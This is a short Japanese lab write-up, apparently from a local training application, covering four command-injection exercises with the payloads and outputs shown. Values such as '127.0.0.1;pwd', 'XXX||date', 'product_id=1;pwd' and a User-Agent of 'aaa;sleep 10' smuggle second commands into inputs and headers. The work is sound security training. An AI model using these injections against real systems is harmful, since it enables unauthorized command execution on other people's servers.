# Command Injection

## Send Ping 1

入力欄にIPアドレスを入れるとPINGの結果が返ってくる。

`127.0.0.1`だと
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.012 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.057 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.067 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.053 ms
64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.070 ms

--- 127.0.0.1 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4183ms
rtt min/avg/max/mdev = 0.012/0.051/0.070/0.020 ms
```

セミコロンでコマンドを結合してみると実行される。
`127.0.0.1;pwd`だと
```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.014 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.057 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.058 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.023 ms
64 bytes from 127.0.0.1: icmp_seq=5 ttl=64 time=0.055 ms

--- 127.0.0.1 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4199ms
rtt min/avg/max/mdev = 0.014/0.041/0.058/0.018 ms
/var/www/html/lab/command-injection/ping-low
```

## Send Ping 2

色々と使えないワードが登録されている。  
＆と；が使えないと来たらパイプ記号の出番。

前のコマンドが失敗したときに後続コマンドを実行する`||`を使ってみる。
`127.0.0.1`ではなく`XXX||date`と入れてみる。
ホスト名XXXは解決できずにpingに失敗し、結果が返ってくる。
```
Thu Oct 13 17:24:11 +04 2022
```

## Stock Control
ボタンを押すと`product_id=1`などとリクエストが飛ぶ。

`product_id=1;pwd`としてあげればコマンドの実行結果が得られる。
```html
 <strong>  <p style="text-align:center;">Stock: 13
/var/www/html/lab/command-injection/stock-check
 Pieces</p></strong>
 ```

## Blind Command Injection
ログインすると`Admin logs your user-agent on their system`と表示される。
どうもUser-Agentをログに取っているらしい。

画面には表れないぽいのでこれもTime basedで確認する。

これで10秒ほど待たされたので効いた模様。
```http
GET /lab/command-injection/blind-command-injection/blind.php HTTP/1.1
Host: localhost:1337
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: aaa;sleep 10
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: "Not;A=Brand";v="99", "Chromium";v="106"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Referer: http://localhost:1337/lab/command-injection/blind-command-injection/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=hrp4do7ps1b81jc4p8ajfd0lna
Connection: close


```
これでもよいですね。
```http
GET /lab/command-injection/blind-command-injection/blind.php HTTP/1.1
Host: localhost:1337
User-Agent: `sleep 10`
Referer: http://localhost:1337/lab/command-injection/blind-command-injection/
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
Cookie: PHPSESSID=hrp4do7ps1b81jc4p8ajfd0lna
Connection: close


```








